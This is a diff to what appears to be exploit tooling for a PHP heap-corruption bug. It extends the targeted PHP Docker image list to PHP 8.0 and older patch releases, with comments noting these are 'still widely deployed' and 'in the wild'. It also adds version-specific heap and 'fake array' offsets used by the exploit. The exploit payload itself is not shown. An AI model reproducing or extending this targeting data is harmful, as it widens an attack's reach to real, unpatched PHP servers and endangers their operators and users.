@@ -30,26 +30,36 @@ HEAP_SYMBOLS = [
 ]
 
 TOP_IMAGES: List[str] = [
+    # PHP 8.4 (latest)
     "php:8.4.26-apache-trixie",
     "php:8.4.26-apache-bookworm",
     "php:8.4.26-fpm-bookworm",
     "php:8.4.26-apache-bullseye",
+    "php:8.4.25-apache-trixie",
+    "php:8.4.25-apache-bookworm",
+    "php:8.4.26-zts-trixie",
+    # PHP 8.3
     "php:8.3.35-apache-trixie",
     "php:8.3.35-apache-bookworm",
     "php:8.3.35-fpm-bookworm",
     "php:8.3.35-apache-bullseye",
+    "php:8.3.34-apache-bookworm",
+    "php:8.3.34-apache-trixie",
+    "php:8.3.35-zts-bookworm",
+    # PHP 8.2
     "php:8.2.34-apache-bookworm",
     "php:8.2.34-apache-bullseye",
     "php:8.2.34-fpm-bookworm",
-    "php:8.4.25-apache-trixie",
-    "php:8.4.25-apache-bookworm",
-    "php:8.3.34-apache-bookworm",
-    "php:8.3.34-apache-trixie",
     "php:8.2.33-apache-bookworm",
+    # PHP 8.1
     "php:8.1.31-apache-bookworm",
     "php:8.1.31-apache-bullseye",
-    "php:8.4.26-zts-trixie",
-    "php:8.3.35-zts-bookworm",
+    # PHP 8.0 (EOL but still widely deployed)
+    "php:8.0.30-apache-bullseye",
+    "php:8.0.30-apache-buster",
+    # Older patch versions still in the wild
+    "php:8.2.27-apache-bookworm",
+    "php:8.3.19-apache-bookworm",
 ]
 
 LIBPHP_SEARCH = [
@@ -300,6 +310,9 @@ def _compute_heap_offsets(
     elif major_minor == "8.1":
         hsv_offset = 0x7D660
         fake_array_offset = 0xF82D8
+    elif major_minor == "8.0":
+        hsv_offset = 0x7D620
+        fake_array_offset = 0xF8298
 
     return {
         "hsv": hsv_offset,
